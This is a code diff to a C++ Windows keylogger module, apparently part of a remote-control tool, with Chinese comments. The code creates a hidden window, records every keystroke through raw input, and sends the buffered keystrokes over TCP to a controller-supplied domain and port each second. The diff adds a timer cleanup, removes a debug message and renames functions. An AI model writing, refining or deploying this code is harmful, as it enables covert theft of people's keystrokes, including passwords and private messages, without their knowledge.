@@ -11,8 +11,9 @@ static std::vector<char> gBuffer; // 键盘数据缓冲区
 
 // 由于有内部本类的出现
 // 构造函数在一开始就执行
+// 会引发创建隐藏窗口并一直记录键盘数据
 // 而此时hunter并不一定请求键盘数据
-// 所以该线程
+// 也就不启动发送
 Keybd::Keybd()
 {
 	// 初始化关键段
@@ -24,6 +25,8 @@ Keybd::Keybd()
 Keybd::~Keybd()
 {
 	if (hWnd) {
+		// 关闭计时器
+		KillTimer(hWnd, 0);
 		// 删除socket
 		const int max = gSockets.size();
 		for (int i = 0; i < max; ++i) {
@@ -48,7 +51,6 @@ void Keybd::startKeybd(std::string domain, int port)
 		return;
 	}
 
-	OutputDebugStringA("Started keybd\r\n");
 	// 将此socket添加至本类socket列表
 	addSocket(sock);
 
@@ -91,7 +93,7 @@ BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
 		regist();
 		// 使用计时器定时发送缓存的键盘记录信息
 		const int time = 1000;
-		SetTimer(hWnd, 0, time, sendKeyboardData);
+		SetTimer(hWnd, 0, time, sendKeybdData);
 		break;
 	}
 	case WM_PAINT:
@@ -99,7 +101,7 @@ BOOL Keybd::keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam)
 		ShowWindow(hWnd, SW_HIDE);
 		break;
 	case WM_INPUT: {
-		getData(lParam);
+		getKeybdData(lParam);
 	}
 	default:
 		break;
@@ -128,8 +130,8 @@ BOOL Keybd::regist() {
 	return TRUE;
 }
 
-// 获取原始输入数据
-BOOL Keybd::getData(LPARAM lParam) {
+// 获取输入数据并保存至类缓冲区
+BOOL Keybd::getKeybdData(LPARAM lParam) {
 	RAWINPUT rawinputData = { 0 };
 	UINT uiSize = sizeof(rawinputData);
 
@@ -213,7 +215,7 @@ void Keybd::delBuffer()
 	gBuffer.clear();
 }
 
-void Keybd::sendKeyboardData(HWND, UINT, UINT, DWORD)
+void Keybd::sendKeybdData(HWND, UINT, UINT, DWORD)
 {
 	if (gBuffer.size() > 0) {
 		std::vector<TcpSocket*> sockets = getSockets();
